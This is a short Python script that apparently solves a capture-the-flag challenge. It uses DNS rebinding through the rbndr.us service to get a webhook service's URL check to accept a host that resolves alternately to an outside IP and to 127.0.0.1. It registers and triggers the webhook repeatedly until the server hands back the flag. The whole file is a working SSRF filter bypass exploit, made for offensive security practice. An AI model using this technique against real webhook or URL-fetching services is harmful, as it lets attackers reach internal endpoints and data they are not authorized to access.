import os
import requests
import time
from socket import inet_aton
#IP for our server hosted on :5001 (this doesn't need to be anything special, just any HTTP server on :5001 will do)
server_ip = os.environ.get("REBIND_IP", "REDACTED") #any public IP (running an HTTP server on :5001 that serves the flag) should work
post_url = os.environ.get("URL", "http://127.0.0.1:25304")

counter = 1
webhook_id = None

#create rebinder url. this is using the rbndr.us site
hex_ip = inet_aton(server_ip).hex().lower()
rebinder_host = f"{hex_ip}.7f000001.rbndr.us"

#register webhook with DNS rebinding
while counter < 100:
    print(f"Attempt {counter}")
    response = requests.post(post_url + "/register", data={
        "url": f"http://{rebinder_host}:5001/flag"
    })
    if response.status_code == 200:
        webhook_id = response.json()["id"]
        print(f"Webhook ID: {webhook_id}")
        break
    time.sleep(0.5) #to account for TTLs
    counter += 1

if counter == 100:
    print("something is not right")
    exit()

#reset counter for triggering webhook
counter = 1
while counter < 100:
    print(f"Attempt {counter}")
    response = requests.post(post_url + "/trigger", data={
        "id": webhook_id 
    })
    if response.status_code == 200:
        flag  = response.json()["response"]
        print(f"Flag: {flag}")
        break
    time.sleep(0.5) #to account for TTLs
    counter += 1

if counter == 100:
    print("something is not right")
